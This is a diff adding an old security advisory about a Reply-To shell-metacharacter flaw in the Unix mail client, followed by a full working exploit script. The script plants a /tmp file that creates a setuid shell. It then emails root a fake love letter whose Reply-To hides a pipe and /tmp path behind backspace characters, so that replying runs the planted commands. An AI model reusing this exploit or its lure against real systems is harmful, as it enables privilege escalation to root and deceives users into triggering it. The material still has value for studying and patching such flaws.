@@ -1,0 +1,74 @@
+source: http://www.securityfocus.com/bid/1910/info
+
+mail is a simple console e-mail client. A vulnerability exists in several vendors' distributions of this program.
+
+An attacker can compose an email message with a carefully-formed string in the Reply-To: field which includes shell meta-characters, and send it to a victim/recipient.
+
+Upon receipt of this message, the recipient might normally see the dangerous text in the Reply-to field and delete the message without responding. 
+
+However, the field can be formed in such a way that these extra characters are concealed. By including a series of ^H characters, the attacker can affect the text in the field as it is displayed on the recipient's screen. As a result, the victim has no visible indication that the message variables (eg, from and reply-to) are malformed.
+
+If the message elicits a response from the user, the contents of the reply-to field will be interpreted as a reference to a pre-existing file in /tmp, placed earlier by the attacker, which can contain arbitrary shell commands. This can grant the attacker an elevation of privileges, to that of his victim, and possibly root (if root replies to the dangerous email..).
+
+#!/bin/sh
+#
+# I-Love-U.sh
+
+# Exploit for | char in mail Reply-To field
+# tested on linux Caldera (techno preview linux 2.4.0)
+#
+
+# Gregory Duchemin ( AKA C3rb3r )
+# Security Consultant
+#
+# NEUROCOM CANADA
+# 1001 bd Maisonneuve Ouest
+# Montreal (Quebec) H3A 3C8 Canada
+# c3rb3r@hotmail.com
+
+
+
+# Cook Ingredients: one | char (hidden in an uppercase i),
+# a bit of evil ^H to hide "/tmp/", and a girl to stimulate a reply ;)
+#
+
+
+cd /tmp
+cat ^H^H^H^H^Hsabelle@hotmail.com << _End
+#!/bin/sh
+cp /bin/sh /tmp/newsh
+chmod a+rws /tmp/newsh
+_End
+
+
+{
+sleep 1
+echo "HELO hotmail.com"
+sleep 1
+echo "MAIL FROM:<Isabelle@hotmail.com>"
+sleep 1
+echo "RCPT TO:<root>"
+sleep 1
+echo "DATA"
+sleep 1
+
+
+# Reply-to will appear as Reply-To:<|sabelle@hotmail.com>
+
+echo "Reply-To:<|/tmp/^H^H^H^H^Hsabelle@hotmail.com>"
+sleep 1
+echo
+echo "I saw you yesterday, since i'm a bit confused..i just wanted"
+echo "to say you."
+echo "I believe I LOVE YOU"
+echo
+echo "Isabelle."
+echo "."
+sleep 1
+echo "QUIT"
+sleep 2
+}|telnet localhost 25
+
+echo "Job is done...now check for newsh in /tmp"
+echo
+echo
